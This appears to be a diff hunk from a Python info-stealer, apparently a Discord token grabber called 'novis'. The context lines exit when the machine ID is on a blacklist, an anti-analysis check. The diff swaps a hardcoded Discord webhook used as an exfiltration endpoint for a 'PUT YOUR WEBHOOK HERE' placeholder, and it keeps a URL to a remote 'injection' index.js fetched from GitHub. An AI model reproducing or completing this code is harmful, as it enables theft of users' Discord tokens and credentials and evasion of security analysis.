@@ -48,8 +48,8 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
 
-
-wh00k = "https://discord.com/api/webhooks/1120253792877809716/6BZIAt6m0E5cS28CGORnyGPkgC8HK2TUKeeE7VvG5TQ_2_7EiR7-_jLVptmpJ0Nn_7F9"
+#novis will not be functional without token being here too!
+wh00k = "PUT YOUR WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/r3nko/injection/main/index.js"
     
 DETECTED = False
